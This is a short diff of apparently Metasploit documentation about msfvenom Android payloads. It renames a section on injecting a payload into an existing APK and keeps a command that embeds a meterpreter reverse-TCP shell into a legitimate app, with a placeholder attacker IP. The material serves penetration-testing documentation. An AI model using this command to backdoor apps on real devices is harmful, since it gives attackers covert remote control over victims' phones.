@@ -40,9 +40,7 @@ Installing these tools (if they are not installed already) will depend on your O
 Apktool can be installed manually or automatically (e.g `brew install apktool` OR `apt install apktool`).
 keytool and jarsigner can be installed by installing the appropriate JDK.
 
-## Inject Payload Into An Existing APK File
-
-Use:
+## Verification Steps
 
 ```
 ./msfvenom -p android/meterpreter/reverse_tcp -x com.existing.apk LHOST=[IP] LPORT=4444 -f raw -o /tmp/android.apk
